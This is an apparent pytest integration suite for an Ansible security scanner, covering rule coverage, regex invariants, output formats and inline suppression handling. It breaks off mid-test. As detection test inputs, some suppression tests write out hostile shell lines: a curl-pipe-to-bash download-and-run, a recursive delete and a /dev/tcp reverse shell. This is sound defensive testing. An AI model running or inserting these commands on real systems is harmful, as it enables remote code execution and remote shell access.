#!/usr/bin/env python3
"""
End-to-end integration tests for ansible-security-scanner.

Runs the whole scanner pipeline (parsing -> pattern match -> suppressions ->
scoring -> output) in-process against fixture playbooks and validates
every consumer: corpus coverage, false-positive count, pattern-file
invariants, and every CLI ``--format`` emitter.

Historically these tests shelled out to the CLI for each assertion,
which reloaded ~1000 patterns and reparsed the ~4000-line bad_example
fixture per invocation - ~85s of subprocess overhead per suite. The
current implementation re-uses a session-scoped ``ScanReport`` fixture
(see ``conftest.py``) and calls the formatter classes directly, cutting
that overhead by ~80%.

Usage:
    python tests/test_integration.py   # standalone mode (prints summary)
    pytest tests/test_integration.py -v

Verifies:
  1. bad_example.yml triggers ALL known rule IDs
  2. clean_example.yml triggers ZERO findings
  3. No duplicate rule IDs across patterns/*.yml
  4. Every regex compiles
  5. Every pattern's category matches its file stem
  6. Every --format value produces parseable output
"""

import csv
import io
import json
import os
import re
import subprocess
import sys
import xml.etree.ElementTree as ET
from pathlib import Path

import pytest
import yaml

SCANNER_ROOT = Path(__file__).resolve().parent.parent
TESTS_DIR = SCANNER_ROOT / "tests" / "playbooks"
PATTERNS_DIR = SCANNER_ROOT / "src" / "ansible_security_scanner" / "patterns"


def _collect_all_rule_ids() -> set:
    """Parse every YAML pattern file and collect rule IDs.

    Patterns with ``exclude: true`` are filter-only (they suppress
    other findings on the same line; they never emit a finding of
    their own rule ID) so they are skipped - requiring them to fire
    would be nonsensical.
    """
    ids = set()
    for yml in sorted(PATTERNS_DIR.glob("*.yml")):
        data = yaml.safe_load(yml.read_text())
        for p in data.get("patterns", []):
            if p.get("exclude"):
                continue
            ids.add(p["id"])
    return ids


def _scan_playbook(target: Path, *, show_suppressed: bool = False, **kwargs):
    """Run the scanner in-process against ``target`` and return its
    ``ScanReport``. Used by the small suppression/taint tests that build
    tmp_path playbooks - the three big integration tests consume the
    shared session-scoped ``bad_example_report`` / ``clean_example_report``
    fixtures instead.
    """
    from ansible_security_scanner import AnsibleSecurityScanner

    scanner = AnsibleSecurityScanner(
        directory=str(target.parent),
        target_files=[str(target)],
        show_suppressed=show_suppressed,
        **kwargs,
    )
    return scanner.scan_directory()


def _report_as_json(report) -> dict:
    """Render a ``ScanReport`` through the JSON formatter and load it
    back as a dict - keeps legacy tests written against the CLI's
    ``--format json`` dict shape working unchanged.
    """
    from ansible_security_scanner import JSONFormatter

    return json.loads(JSONFormatter(show_all=True).format(report))


# Preserved for the handful of legacy callers that still want a
# subprocess-returned JSON dict (``main()`` standalone runner and the
# one CLI-flag test that has to exercise argparse). Everything else has
# been migrated to the in-process path above.
def _run_scan(target: Path, *, show_suppressed: bool = False) -> dict:
    """Subprocess-based scan for the CLI-flag test and the standalone
    ``main()`` runner. Prefer ``_scan_playbook`` + ``_report_as_json``
    in pytest tests - they skip the interpreter / pattern-reload cost.
    """
    cmd = [
        sys.executable,
        "-m",
        "ansible_security_scanner",
        "--directory",
        str(target.parent),
        "--files",
        str(target),
        "--format",
        "json",
    ]
    if show_suppressed:
        cmd.append("--show-suppressed")
    env = os.environ.copy()
    src_dir = str(SCANNER_ROOT / "src")
    env["PYTHONPATH"] = src_dir + os.pathsep + env.get("PYTHONPATH", "")
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        cwd=str(SCANNER_ROOT),
        env=env,
    )
    if not result.stdout.strip():
        raise RuntimeError(f"scanner produced empty stdout.\nstderr:\n{result.stderr}")
    return json.loads(result.stdout)


def test_bad_example_full_coverage(all_rule_ids, bad_example_json):
    """Every rule ID must fire at least once on ``bad_example.yml``.

    ``bad_example.yml`` is the single source of truth for the corpus - every
    pattern in ``patterns/*.yml`` must be triggered by at least one snippet
    in that file. Rules that require a specific filename (e.g. a real
    ``requirements.yml``) are not added to the pattern set and are enforced
    by dedicated unit tests instead.

    Some rules belong to an overlap-suppression group (see
    ``_OVERLAP_SUPPRESSION_GROUPS`` in ``file_scanner.py``): when multiple
    rules in the same group fire on the same line, only the most specific
    one is kept. For coverage purposes, a less-specific rule counts as
    "triggered" if ANY rule in its group fires on bad_example.yml - the
    rule IS reachable, it just yields precedence when a tighter rule
    matches the same line. Dedicated unit tests exercise each
    overlap-group member's regex in isolation (via ``positive_examples``).
    """
    from ansible_security_scanner.file_scanner import _OVERLAP_SUPPRESSION_GROUPS

    triggered = {f["rule_id"] for f in bad_example_json.get("findings", [])}

    # Expand ``triggered`` so that if any member of an overlap group fires,
    # every other member of that group is treated as covered.
    expanded = set(triggered)
    for group in _OVERLAP_SUPPRESSION_GROUPS:
        if any(r in triggered for r in group):
            expanded.update(group)

    missing = sorted(all_rule_ids - expanded)
    assert len(missing) == 0, f"{len(missing)} rule(s) not triggered:\n" + "\n".join(
        f"  - {m}" for m in missing
    )


def test_clean_example_zero_findings(clean_example_json):
    """clean_example.yml must produce ZERO findings."""
    findings = clean_example_json.get("findings", [])
    assert len(findings) == 0, f"{len(findings)} unexpected finding(s):\n" + "\n".join(
        f"  - {f['rule_id']} (line {f['line_number']})" for f in findings[:20]
    )


def test_multi_example_clean_zero_findings(multi_example_clean_json):
    """``tests/playbooks/multi_example_clean/`` must produce ZERO findings.

    This fixture is a realistic hardened Ansible role split across
    six files (``site.yml`` + ``roles/webapp/{meta,defaults,tasks}``)
    exercising cross-file patterns the single-file ``clean_example.yml``
    can't reach. Any non-zero result means a rule is false-positiving
    on a legitimate role layout - the dominant source of real-world
    user trust loss. Fails loud, fails fast.
    """
    findings = multi_example_clean_json.get("findings", [])
    assert len(findings) == 0, (
        f"{len(findings)} unexpected finding(s) on hardened multi-file fixture:\n"
        + "\n".join(
            f"  - {f['rule_id']} @ {f['file_path']}:{f['line_number']}" for f in findings[:20]
        )
    )


# The rule IDs below are the REQUIRED FLOOR on
# ``tests/playbooks/multi_example_bad/``. Every one of them exercises a
# cross-file or role-layout capability that the single-file
# ``bad_example.yml`` cannot: if any of them regresses to zero, the
# scanner has silently lost coverage for real-world Ansible projects.
#
# Additions to this set are welcome (a new pattern rule that reliably
# fires on the fixture strengthens the regression gate); removals need
# a paired justification in the commit message.
_MULTI_BAD_REQUIRED_RULE_IDS: frozenset[str] = frozenset(
    {
        # Cross-file taint: untrusted_token set in site.yml is rendered
        # into an ansible.builtin.shell invocation in install.yml.
        # The TaintTracker only catches this if (a) it can read role
        # task files (which live as bare task lists, not plays) and
        # (b) the cross-file pipeline runs end-to-end. Losing this
        # finding is the canonical regression signal.
        "cross_file_taint",
        # Role-meta hygiene: galaxy_info without `license:`.
        "role_meta_galaxy_info_missing_license",
        # Role task-file AST check: block without rescue/always. Only
        # reachable if ``extract_all_tasks`` understands role task
        # file shape.
        "ansible_block_without_rescue_or_always",
        # Role task-file AST check: pip module without --require-hashes.
        "pip_install_without_hash_check_from_public_index",
        # Role task-file AST check: get_url missing a checksum.
        "get_url_no_checksum",
        # Role task-file AST check: missing no_log on a task that
        # forwards a credential to an outbound URI.
        "missing_no_log",
        # SLSA provenance verification missing - exercises the
        # file-scope post-filter on a multi-file scan.
        "slsa_provenance_verification_missing",
        # Credential and supply-chain patterns that must fire on the
        # defaults / install task files.
        "hardcoded_credentials",
        "stripe_api_key",
        "aws_access_key",
        # The fixture's `image: "nginx:latest"` line fires both
        # ``container_image_unpinned_tag`` and ``k8s_image_latest_or_untagged``;
        # they're the same finding under different framings, and overlap
        # suppression keeps the spec-aware ``k8s_*`` one. We require the
        # k8s-spec rule here as the canonical signal that we DO catch the
        # unpinned-image shape; ``container_image_unpinned_tag`` still has
        # plenty of independent coverage on non-k8s tasks (Docker Compose,
        # ansible-navigator EE, etc.) elsewhere in the corpus.
        "k8s_image_latest_or_untagged",
        "ssh_config_manipulation",
        "kernel_dmesg_restrict_disabled",
    }
)

# Lower-bound on the absolute finding count. Chosen with margin so
# benign pattern-tuning doesn't tickle this gate, but tight enough
# that a silent ~50% regression (e.g. TaintTracker or extract_all_tasks
# shape detection breaking) surfaces immediately.
_MULTI_BAD_MIN_FINDINGS = 30


def test_multi_example_bad_known_findings(multi_example_bad_json):
    """``tests/playbooks/multi_example_bad/`` must trigger every rule
    in ``_MULTI_BAD_REQUIRED_RULE_IDS`` at least once, and produce at
    least ``_MULTI_BAD_MIN_FINDINGS`` total findings.

    The floor set targets cross-file / role-layout-specific
    capabilities - losing any of them means the scanner has silently
    regressed on realistic Ansible repos. The numeric floor catches
    broad-stroke regressions the rule-floor check can't see (e.g.
    every non-floor rule silently dropping out).
    """
    findings = multi_example_bad_json.get("findings", [])
    triggered = {f["rule_id"] for f in findings}

    missing = _MULTI_BAD_REQUIRED_RULE_IDS - triggered
    assert not missing, (
        f"{len(missing)} required rule ID(s) not triggered on "
        f"multi_example_bad/ - real-world Ansible role coverage has "
        f"regressed:\n"
        + "\n".join(f"  - {rid}" for rid in sorted(missing))
        + f"\n\nTriggered rule IDs ({len(triggered)}): "
        + ", ".join(sorted(triggered))
    )

    assert len(findings) >= _MULTI_BAD_MIN_FINDINGS, (
        f"multi_example_bad/ produced {len(findings)} finding(s); "
        f"expected at least {_MULTI_BAD_MIN_FINDINGS}. A large drop "
        f"in absolute count usually signals a silent regression in "
        f"a broad rule category (e.g. credential heuristics, windowed "
        f"scanning)."
    )


def test_multi_example_bad_exercises_cross_file_taint(multi_example_bad_json):
    """``cross_file_taint`` must fire with source in ``site.yml`` and
    sink in a ``roles/webapp/tasks/*.yml`` file.

    This is the signature capability the multi-file bad fixture was
    built to regression-test. A cross-file taint finding that stays
    within a single file is NOT what this check wants to see: the
    source file and the sink file must differ.
    """
    findings = multi_example_bad_json.get("findings", [])
    taint_findings = [f for f in findings if f.get("rule_id") == "cross_file_taint"]
    assert taint_findings, (
        "No cross_file_taint findings - the TaintTracker -> role-task-file "
        "pipeline has regressed. Check `_ast_helpers.extract_all_tasks` "
        "shape detection and `TaintTracker.scan_sinks` coverage."
    )
    sink_paths = {f.get("file_path", "") for f in taint_findings}
    assert any("roles/webapp/tasks/" in p for p in sink_paths), (
        f"cross_file_taint fired ({len(taint_findings)}×) but no sink "
        f"was inside a role task file (expected roles/webapp/tasks/...). "
        f"Sink paths seen: {sorted(sink_paths)}"
    )


def test_no_duplicate_pattern_ids(all_patterns_flat):
    """Every pattern ID must be unique across all YAML files."""
    seen = {}
    dupes = []
    for yml, p in all_patterns_flat:
        pid = p["id"]
        if pid in seen:
            dupes.append(f"  {pid}: in {seen[pid]} AND {yml.name}")
        seen[pid] = yml.name
    assert len(dupes) == 0, f"{len(dupes)} duplicate ID(s):\n" + "\n".join(dupes)


def test_no_duplicate_pattern_titles(all_patterns_flat):
    """Display ``title`` must be unique too. Two distinct rule_ids
    sharing one title silently breaks ignore-list curation: an operator
    reads the title in a Markdown report, picks ``the`` rule_id from
    ``--list-rules``, and is confused when findings persist (canonical
    regression: ``setuid_binary_creation`` and
    ``setuid_binary_creation_compromise`` both rendered as ``SetUID
    Binary Creation``). Disambiguate with a category-scoped qualifier
    in the YAML title rather than reusing the raw phrase."""
    seen: dict[str, str] = {}
    dupes: list[str] = []
    for yml, p in all_patterns_flat:
        title = p.get("title", "")
        if not title:
            continue
        if title in seen:
            dupes.append(f"  {title!r}: in {seen[title]} AND {yml.name} ({p['id']})")
        seen[title] = f"{yml.name} ({p['id']})"
    assert len(dupes) == 0, f"{len(dupes)} duplicate title(s):\n" + "\n".join(dupes)


def test_identical_regexes_are_paired_in_overlap_suppression(all_patterns_flat):
    """When two distinct rule_ids share the same regex they will both
    fire on every match. That's only acceptable when the pair is listed
    in ``_OVERLAP_SUPPRESSION_GROUPS`` so the deduper keeps just one
    finding per ``(file, line)``. The sentinel ``(?!)`` regex is
    explicitly allowed because rules using it skip the regex pass and
    rely on a Python AST/semantic walker instead."""
    from collections import defaultdict

    from ansible_security_scanner.file_scanner import _OVERLAP_SUPPRESSION_GROUPS

    by_regex: dict[tuple[str, bool], list[str]] = defaultdict(list)
    for _, p in all_patterns_flat:
        regex = p.get("regex", "")
        if regex == "(?!)":
            continue
        by_regex[(regex, bool(p.get("multiline")))].append(p["id"])

    paired: set[frozenset[str]] = {frozenset(g) for g in _OVERLAP_SUPPRESSION_GROUPS}

    unpaired: list[str] = []
    for (regex, _), ids in by_regex.items():
        if len(ids) < 2:
            continue
        if not any(frozenset(ids).issubset(g) for g in paired):
            unpaired.append(f"  {sorted(ids)}: regex={regex[:80]}")

    assert not unpaired, (
        f"{len(unpaired)} regex(es) are shared by distinct rule_ids without an "
        f"overlap-suppression group entry; either give one rule a tighter regex "
        f"or add the pair to _OVERLAP_SUPPRESSION_GROUPS in file_scanner.py:\n"
        + "\n".join(unpaired)
    )


def test_all_regexes_compile(all_patterns_flat):
    """Every regex in every pattern file must be valid Python regex."""
    errors = []
    for yml, p in all_patterns_flat:
        try:
            re.compile(p["regex"], re.IGNORECASE)
        except re.error as e:
            errors.append(f"  {p['id']} in {yml.name}: {e}")
    assert len(errors) == 0, f"{len(errors)} broken regex(es):\n" + "\n".join(errors)


def test_no_broken_lazy_negative_lookahead_anti_pattern(all_patterns_flat):
    """
    Guard against the `[\\s\\S]{0,N}?(?!FORBIDDEN)` anti-pattern.

    That construct is structurally broken: the lazy quantifier matches zero
    characters, the negative lookahead then asserts the very next position
    isn't `FORBIDDEN`, and the regex succeeds - never actually inspecting
    the surrounding window. The intended semantics ("anchor not followed
    by FORBIDDEN anywhere in the next N chars") require a tempered greedy
    token: `(?:(?!FORBIDDEN)[\\s\\S]){0,N}`.

    Rules that previously contained this anti-pattern produced:
      * bare-header snippets (match body = just the anchor string),
      * unbounded false-positive rates (every anchor occurrence fired),

    so this test ensures the anti-pattern cannot silently return.
    """
    offenders = []
    for yml, p in all_patterns_flat:
        if "}?(?!" in p.get("regex", ""):
            offenders.append(f"  {p['id']} in {yml.name}")
    assert not offenders, (
        "Found lazy-quantifier-plus-negative-lookahead anti-pattern in:\n"
        + "\n".join(offenders)
        + "\n\nRewrite each offender using the tempered-greedy-token form:\n"
        + "  X[\\s\\S]{0,N}?(?!FORBIDDEN) -> X(?:(?!FORBIDDEN)[\\s\\S]){0,N}"
    )


# The extractor picks the most informative line(s) from each multi-line
# regex match so reports show real evidence instead of a module header.
# These cases cover the two regime the extractor must handle:
#   (1) rules that name a specific bad argument (e.g. `validate_certs`),
#   (2) structural rules with no keyword discriminator (e.g. SLSA missing
#       verifier), where the best we can do is header + first argument.


def test_extractor_handles_regex_escape_sequences():
    """
    `\\b`, `\\s`, `\\d`, etc. must not be treated as literal tokens.

    Before this fix, a regex like `\\bvalidate_certs\\b` had its escapes
    glued onto adjacent text, producing `bvalidate_certs` - a token that
    never appears in any playbook, so every line scored zero and the
    extractor fell back to the first argument (often `url:`), hiding
    the actual violating argument from the report.
    """
    from ansible_security_scanner.file_scanner import FileScanner

    regex = (
        r"(?ms)(?:ansible\.builtin\.uri)\s*:[\s\S]{0,1500}?"
        r"\bvalidate_certs\s*:\s*(?:false|no)\b"
    )
    discs = FileScanner._pattern_discriminators(regex)
    assert "validate_certs" in discs, f"expected 'validate_certs', got {discs}"
    assert "bvalidate_certs" not in discs, f"regex escape \\b leaked into discriminator: {discs}"

    body = (
        "ansible.builtin.uri:\n"
        '        url: "https://x"\n'
        "        method: GET\n"
        "        user: admin\n"
        "        validate_certs: no"
    )
    snippet, _ = FileScanner._extract_evidence_snippet(body, regex)
    assert "validate_certs: no" in snippet, snippet


def test_extractor_picks_validate_certs_line():
    from ansible_security_scanner.file_scanner import FileScanner

    match_body = (
        "ansible.builtin.uri:\n"
        '        url: "{{ X }}:8089/services/messages"\n'
        "        method: GET\n"
        "        user: admin\n"
        '        password: "{{ PW }}"\n'
        "        force_basic_auth: yes\n"
        "        validate_certs: no\n"
    )
    pattern = (
        r"(?:ansible\.builtin\.uri|^\s*uri)\s*:[\s\S]{0,600}?"
        r"validate_certs\s*:\s*(?:false|no|0)"
    )
    snippet, _ = FileScanner._extract_evidence_snippet(match_body, pattern)
    assert "ansible.builtin.uri:" in snippet, snippet
    assert "validate_certs: no" in snippet, snippet


def test_extractor_falls_back_to_first_arg_when_no_discriminator():
    from ansible_security_scanner.file_scanner import FileScanner

    match_body = (
        'ansible.builtin.uri:\n        url: "{{ X }}:8089/services/messages"\n        method: GET\n'
    )
    pattern = (
        r"(?:ansible\.builtin\.(?:get_url|uri|unarchive))"
        r"(?:(?!slsa-verifier|cosign\s+verify-attestation)[\s\S]){0,2000}"
    )
    snippet, _ = FileScanner._extract_evidence_snippet(match_body, pattern)
    assert "ansible.builtin.uri:" in snippet, snippet
    assert "url:" in snippet, snippet
    # No "validate_certs" keyword discriminator for this rule - extractor
    # must NOT invent evidence that isn't there.
    assert "# ..." not in snippet, snippet


def test_extractor_single_line_match_returns_that_line():
    from ansible_security_scanner.file_scanner import FileScanner

    snippet, _ = FileScanner._extract_evidence_snippet(
        "validate_certs: false", r"validate_certs\s*:\s*false"
    )
    assert snippet == "validate_certs: false"


def test_extractor_never_returns_bare_module_header():
    from ansible_security_scanner.file_scanner import FileScanner

    match_body = 'ansible.builtin.uri:\n        url: "https://x.example"\n        method: GET\n'
    pattern = r"ansible\.builtin\.uri(?:(?!forbidden)[\s\S]){0,500}"
    snippet, _ = FileScanner._extract_evidence_snippet(match_body, pattern)
    stripped_lines = [ln.strip() for ln in snippet.splitlines() if ln.strip()]
    assert len(stripped_lines) > 1, "extractor returned only a module-header line: " + repr(snippet)


def test_proximity_superseding_drops_generic_ssl_rule_on_uri_tasks(tmp_path):
    """
    When `ansible.builtin.uri With validate_certs: false` fires on a task,
    the generic `ssl_verification_disabled` rule (which also flags
    `validate_certs: no` anywhere) must NOT additionally fire inside the
    same task - otherwise every TLS-disabled `uri` task produces two
    findings with overlapping evidence.

    Verified by running the real scanner against a tiny playbook so the
    full dedup pipeline exercises, not just the in-memory helper.
    """
    from ansible_security_scanner.file_scanner import FileScanner

    playbook = tmp_path / "tls.yml"
    playbook.write_text(
        "- hosts: localhost\n"
        "  tasks:\n"
        "    - name: do thing\n"
        "      ansible.builtin.uri:\n"
        '        url: "https://example.invalid/api"\n'
        "        method: GET\n"
        "        validate_certs: no\n"
    )
    scanner = FileScanner(tmp_path)
    findings, _ = scanner.scan_file(playbook)
    rule_ids = {f.rule_id for f in findings}
    assert "uri_module_validate_certs_false" in rule_ids, (
        f"specific uri rule should still fire; got {rule_ids}"
    )
    assert "ssl_verification_disabled" not in rule_ids, (
        "generic ssl_verification_disabled must be superseded by "
        f"the richer uri_module_validate_certs_false; got {rule_ids}"
    )


def test_proximity_superseding_keeps_generic_ssl_rule_without_specific_match(tmp_path):
    """
    If the module-specific rule does NOT fire (e.g. `validate_certs: no`
    appears in a non-`uri` context), the generic `ssl_verification_disabled`
    must continue to fire so coverage isn't lost.
    """
    from ansible_security_scanner.file_scanner import FileScanner

    playbook = tmp_path / "generic.yml"
    playbook.write_text(
        "# Not a uri/yum/dnf task - generic fallback must still fire.\n"
        "app_config:\n"
        "  verify_ssl: false\n"
    )
    scanner = FileScanner(tmp_path)
    findings, _ = scanner.scan_file(playbook)
    rule_ids = {f.rule_id for f in findings}
    assert "ssl_verification_disabled" in rule_ids, (
        f"generic rule must still fire when no module-specific rule supersedes it; got {rule_ids}"
    )


def test_category_matches_file(all_patterns_flat):
    """Every pattern's category field must match its file stem."""
    mismatches = []
    for yml, p in all_patterns_flat:
        stem = yml.stem
        if p.get("category") != stem:
            mismatches.append(
                f"  {yml.name}: {p['id']} has category='{p['category']}' (expected '{stem}')"
            )
    assert len(mismatches) == 0, f"{len(mismatches)} category mismatch(es):\n" + "\n".join(
        mismatches[:30]
    )


# Every CLI --format value, paired with a callable that parses the output
# and raises if the structure is invalid. Keeps the check strict: empty or
# syntactically-broken output fails the test.
def _validate_markdown(text: str) -> None:
    # Markdown is free-form; at minimum confirm the report header rendered
    # and that findings are being listed.
    assert "Security" in text, "markdown output missing 'Security' header"
    assert text.strip(), "markdown output is empty"


def _validate_json(text: str) -> None:
    # With progress output now routed to stderr, stdout is pure JSON.
    payload = json.loads(text)
    assert "findings" in payload, "json output missing 'findings' key"
    assert isinstance(payload["findings"], list), "'findings' is not a list"


def _validate_xml(text: str) -> None:
    ET.fromstring(text)


def _validate_yaml(text: str) -> None:
    # Output is plain YAML (no document separator). Parse it whole.
    # Any human-readable banner the scanner prints goes to stderr, not
    # stdout, so what we see here is the YAML document.
    doc = yaml.safe_load(text)
    assert isinstance(doc, dict), f"yaml root is {type(doc).__name__}, expected dict"
    assert "findings" in doc, "yaml output missing 'findings' key"
    assert isinstance(doc["findings"], list), "'findings' is not a list"


def _validate_csv(text: str) -> None:
    # stdout should be pure CSV now (no banner interleaved).
    # Raise csv field size limit: rule descriptions/recommendations legitimately
    # exceed the 128KB default when dumping ~900 rules.
    csv.field_size_limit(10 * 1024 * 1024)
    rows = list(csv.reader(io.StringIO(text)))
    assert len(rows) >= 2, f"csv has {len(rows)} row(s), expected header + data"
    assert len(rows[0]) >= 3, f"csv header too narrow: {rows[0]}"


def _validate_html(text: str) -> None:
    lower = text.lower()
    assert "<html" in lower or "<!doctype html" in lower, "html output missing <html>"
    assert "</html>" in lower, "html output missing closing </html>"


def _validate_junit(text: str) -> None:
    root = ET.fromstring(text)
    assert root.tag in ("testsuites", "testsuite"), (
        f"junit root is <{root.tag}>, expected <testsuites> or <testsuite>"
    )


def _validate_sarif(text: str) -> None:
    doc = json.loads(text)
    assert doc.get("version", "").startswith("2.1"), (
        f"sarif version is {doc.get('version')!r}, expected 2.1.x"
    )
    assert "$schema" in doc, "sarif output missing $schema"
    assert isinstance(doc.get("runs"), list) and doc["runs"], "sarif 'runs' missing or empty"


FORMAT_VALIDATORS = {
    "markdown": _validate_markdown,
    "json": _validate_json,
    "xml": _validate_xml,
    "yaml": _validate_yaml,
    "csv": _validate_csv,
    "html": _validate_html,
    "junit": _validate_junit,
    "sarif": _validate_sarif,
}


def _run_scan_raw(target: Path, fmt: str) -> str:
    """Run the scanner and return raw stdout (no JSON parsing)."""
    cmd = [
        sys.executable,
        "-m",
        "ansible_security_scanner",
        "--directory",
        str(target.parent),
        "--files",
        str(target),
        "--format",
        fmt,
    ]
    env = os.environ.copy()
    src_dir = str(SCANNER_ROOT / "src")
    env["PYTHONPATH"] = src_dir + os.pathsep + env.get("PYTHONPATH", "")
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        cwd=str(SCANNER_ROOT),
        env=env,
    )
    if not result.stdout.strip():
        raise RuntimeError(
            f"scanner produced empty stdout for --format {fmt}\nstderr:\n{result.stderr}"
        )
    return result.stdout


def test_all_output_formats_valid(bad_example_report):
    """Every --format value must produce valid, parseable output.

    Uses the shared session-scoped ``bad_example_report`` fixture - each
    formatter is invoked directly on the already-built ``ScanReport`` so
    we skip eight subprocess boots and pattern reloads. Rendering the
    eight serializers in a thread pool keeps wall-clock low; each render
    is pure CPU + string building and the total is bounded by the
    slowest formatter rather than their sum.
    """
    from concurrent.futures import ThreadPoolExecutor

    from ansible_security_scanner.utils import get_formatter_class

    def _render_and_validate(item):
        fmt, validator = item
        try:
            formatter = get_formatter_class(fmt)(show_all=True)
            output = formatter.format(bad_example_report)
            if not output.strip():
                raise RuntimeError(f"formatter produced empty output for --format {fmt}")
            validator(output)
            return None
        except Exception as exc:
            return f"  {fmt}: {type(exc).__name__}: {exc}"

    with ThreadPoolExecutor(max_workers=len(FORMAT_VALIDATORS)) as ex:
        results = list(ex.map(_render_and_validate, FORMAT_VALIDATORS.items()))

    failures = [r for r in results if r is not None]
    assert not failures, f"{len(failures)} format(s) produced invalid output:\n" + "\n".join(
        failures
    )


def test_markdown_critical_and_high_findings_carry_rule_id(bad_example_report):
    """Every CRITICAL / HIGH finding rendered into Markdown must show
    its ``rule_id`` next to the title. Operators curate ``--ignore``
    lists by reading the report; without the ``rule_id`` two rules
    that share a display ``title`` (the SetUID-binary precedent) are
    indistinguishable and the ignore list silently misses one.
    """
    from ansible_security_scanner.formatters.markdown import MarkdownFormatter

    output = MarkdownFormatter(show_all=True).format(bad_example_report)
    rendered = [f for f in bad_example_report.findings if f.severity in {"CRITICAL", "HIGH"}]
    assert rendered, "fixture must produce at least one CRITICAL/HIGH finding"

    missing = [f.rule_id for f in rendered if f"`{f.rule_id}`" not in output]
    assert not missing, (
        f"{len(missing)} rendered finding(s) missing rule_id in Markdown: "
        f"{sorted(set(missing))[:10]}"
    )


def test_overlap_suppression_dedupes_slack_and_google_aiza_pairs(tmp_path):
    """``slack_webhook`` / ``slack_webhook_url`` and ``google_api_key`` /
    ``youtube_api_key`` share their regex; without an overlap-suppression
    entry they double-fire on every match. The fixture intentionally
    triggers both pairs and asserts the deduper kept only the canonical
    framing."""
    playbook = _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  vars:
    slack: "https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
    yt: "AIzaSyABCDEFGHIJKLMNOPQRSTUVWXYZ0123456"
""",
    )
    findings = _scan_playbook(playbook).findings
    on_slack_line = {f.rule_id for f in findings if f.line_number == 4}
    on_aiza_line = {f.rule_id for f in findings if f.line_number == 5}

    assert "slack_webhook_url" in on_slack_line, on_slack_line
    assert "slack_webhook" not in on_slack_line, (
        f"slack_webhook should be suppressed by slack_webhook_url; got {on_slack_line}"
    )
    assert "google_api_key" in on_aiza_line, on_aiza_line
    assert "youtube_api_key" not in on_aiza_line, (
        f"youtube_api_key should be suppressed by google_api_key; got {on_aiza_line}"
    )


# Folded in from the former tests/test_suppressions.py so everything lives
# in one place. These exercise the hardening rules in suppressions.py:
#   - bare `# nosec` (no rule list) is REJECTED
#   - missing `reason="..."` is REJECTED
#   - UNSUPPRESSABLE_RULE_IDS cannot be silenced
#   - suspicious_suppression meta-finding fires on high-risk content
# The unit tests call the parser directly; the integration tests shell
# out to the CLI against small tmp_path playbooks so the whole pipeline
# (parsing -> scanning -> scoring -> output) is exercised.


def _write_tmp_playbook(tmp_path: Path, content: str) -> Path:
    f = tmp_path / "tmp_play.yml"
    f.write_text(content)
    return f


def test_suppressions_unit_valid_directive():
    """A well-formed directive (rule list + reason) parses as valid."""
    from ansible_security_scanner.suppressions import parse_suppressions

    lines = [
        'shell: curl http://x.example/y.sh | bash  # nosec: curl_pipe_to_shell reason="dev sandbox"',
    ]
    sup, warns = parse_suppressions(lines)
    assert 1 in sup
    assert sup[1].valid is True
    assert sup[1].rule_ids == {"curl_pipe_to_shell"}
    assert sup[1].reason == "dev sandbox"
    assert warns == []


def test_suppressions_unit_bare_nosec_is_rejected():
    """Bare `# nosec` (no rule list, no reason) is reported as a warning
    and not applied - regression guard for the silent bypass hole."""
    from ansible_security_scanner.suppressions import parse_suppressions

    lines = ["shell: curl http://x/y.sh | bash  # nosec"]
    sup, warns = parse_suppressions(lines)
    assert sup[1].valid is False
    assert len(warns) == 1
    assert "missing rule list" in warns[0].reason
    assert "missing reason" in warns[0].reason


def test_suppressions_unit_missing_reason_is_rejected():
    """A directive with a rule list but no reason is invalid."""
    from ansible_security_scanner.suppressions import parse_suppressions

    lines = ["shell: rm -rf /tmp/x  # nosec: recursive_delete"]
    sup, warns = parse_suppressions(lines)
    assert sup[1].valid is False
    assert len(warns) == 1
    assert "missing reason" in warns[0].reason


def test_suppressions_unit_missing_rule_list_is_rejected():
    """A bare `# nosec reason="x"` (no rule IDs) is invalid."""
    from ansible_security_scanner.suppressions import parse_suppressions

    lines = ['shell: curl http://x/y.sh | bash  # nosec reason="whatever"']
    sup, warns = parse_suppressions(lines)
    assert sup[1].valid is False
    assert any("missing rule list" in w.reason for w in warns)


def test_suppressions_unit_star_wildcard_is_valid():
    """`# nosec: *` with a reason is accepted as "suppress any rule on
    this line, EXCEPT the unsuppressable ones"."""
    from ansible_security_scanner.suppressions import match_suppression, parse_suppressions

    lines = ['shell: cmd  # nosec: * reason="sandbox smoke test"']
    sup, warns = parse_suppressions(lines)
    assert sup[1].valid is True and warns == []
    assert match_suppression(sup, 1, "any_rule") is not None
    assert match_suppression(sup, 1, "reverse_shell") is None  # unsuppressable


def test_suppressions_unit_unsuppressable_rule_cannot_be_silenced():
    """Listing an UNSUPPRESSABLE rule explicitly is rejected."""
    from ansible_security_scanner.suppressions import match_suppression, parse_suppressions

    lines = [
        'shell: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1  # nosec: reverse_shell reason="pentest"'
    ]
    sup, warns = parse_suppressions(lines)
    assert sup[1].valid is False, "should have been rejected"
    assert any("cannot be suppressed" in w.reason for w in warns)
    assert match_suppression(sup, 1, "reverse_shell") is None


def test_suppressions_unit_regular_comments_are_not_directives():
    """Plain YAML comments (without nosec/noqa keywords) must not parse as
    suppression directives. Regression guard for the VERBOSE `#` bug."""
    from ansible_security_scanner.suppressions import parse_suppressions

    lines = [
        "---",
        "# This is a normal comment",
        "# Do not run this!",
        "- hosts: all",
    ]
    sup, warns = parse_suppressions(lines)
    assert sup == {}
    assert warns == []


def test_suppressions_integration_valid_suppression_hidden_by_default(tmp_path):
    """A valid reasoned directive removes findings from the default report."""
    playbook = _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  tasks:
    - name: curl pipe bash (suppressed, internal)
      ansible.builtin.shell: "curl http://x.example.com | bash"  # nosec: curl_pipe_to_shell reason="internal only"
""",
    )
    data = _report_as_json(_scan_playbook(playbook))
    assert all(
        f["rule_id"] != "curl_pipe_to_shell" or f["line_number"] != 5
        for f in data.get("findings", [])
    ), "valid suppression should hide curl_pipe_to_shell on line 5"


def test_suppressions_integration_show_suppressed_reveals_them(tmp_path):
    """With --show-suppressed, the suppressed finding returns with
    ``suppressed_by`` populated for audit."""
    playbook = _write_tmp_playbook(
        tmp_path,
        """---
- hosts: all
  tasks:
    - name: curl pipe bash
